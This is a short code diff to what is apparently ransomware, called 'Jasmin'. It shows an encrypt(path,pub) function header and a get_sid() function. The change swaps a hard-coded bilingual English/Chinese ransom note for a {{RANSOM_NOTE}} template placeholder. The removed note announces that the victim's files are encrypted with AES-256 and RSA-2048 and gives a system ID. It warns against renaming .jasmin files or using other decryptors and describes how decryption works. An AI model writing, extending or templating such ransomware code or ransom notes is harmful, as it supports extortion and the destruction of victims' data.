@@ -42,19 +42,7 @@ def encrypt(path,pub):
     except:return False
 
 RANSOM_TXT="""
-╔══════════════════════════════════════════════════╗
-║       YOUR FILES HAVE BEEN ENCRYPTED             ║
-║           你的文件已被加密                         ║
-╚══════════════════════════════════════════════════╝
-
-AES-256 + RSA-2048 军事级加密。 系统ID: {sid}
-
-⚠️ 不要重命名/删除 .jasmin 文件，不要用第三方软件解密。
-
-🔓 解密: pip3 install cryptography
-        python3 jasmin_decrypt.py private_key.pem
-
-✅ SHA-256 校验确保文件100%还原
+{{RANSOM_NOTE}}
 """
 
 def get_sid():
